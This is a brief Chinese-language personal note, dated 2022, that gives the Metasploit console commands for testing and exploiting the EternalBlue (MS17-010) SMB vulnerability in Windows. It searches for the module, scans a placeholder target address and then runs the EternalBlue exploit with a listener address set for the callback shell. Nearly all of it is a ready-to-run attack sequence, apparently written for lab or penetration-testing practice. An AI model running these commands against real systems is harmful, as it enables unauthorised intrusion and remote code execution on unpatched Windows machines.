# msf测试永恒之蓝

```bash
# 启动msf
msfconsole

# 搜索永恒之蓝相关模块
search ms17_010

# 使用该模块探测目标机器是否有漏洞
use auxiliary/scanner/smb/smb_ms17_010
show options  # 看看需要设置的东西
set rhosts 1.2.3.4  # 设置目标ip
run  # 开始探测，也可以换成"exploit"

# 使用该模块攻击目标
use exploit/windows/smb/ms17_010_eternalblue
show options
set rhosts 1.2.3.4  # 设置目标ip
set lhost 1.2.3.5  # 如果默认是127.0.0.1，可以设置lhost，使目标机器可以访问
run  # 开始攻击
```


2022/4/8  
